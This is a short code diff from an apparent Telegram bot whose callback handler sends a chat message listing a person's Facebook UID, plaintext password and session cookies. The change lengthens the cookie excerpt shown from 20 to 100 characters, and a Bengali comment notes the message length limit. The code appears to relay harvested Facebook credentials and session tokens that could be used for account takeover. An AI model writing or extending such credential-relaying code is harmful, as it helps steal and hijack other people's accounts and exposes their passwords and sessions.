@@ -307,7 +307,7 @@ def handle_callbacks(call):
                 f"🏷️ Username: @{data.get('tg_username', 'N/A')}\n"
                 f"🔵 Facebook UID: `{fb_uid}`\n"
                 f"🔒 Password: `{data.get('password', 'N/A')}`\n"
-                f"🍪 Cookies: `{data.get('cookies', 'N/A')[:20]}...`" # কুকিজ অনেক বড় হলে মেসেজ লিমিট পার হতে পারে
+                f"🍪 Cookies: `{data.get('cookies', 'N/A')[:100]}...`" # কুকিজ অনেক বড় হলে মেসেজ লিমিট পার হতে পারে
             )
             bot.send_message(chat_id, details, reply_markup=fkb, parse_mode="Markdown")
         return
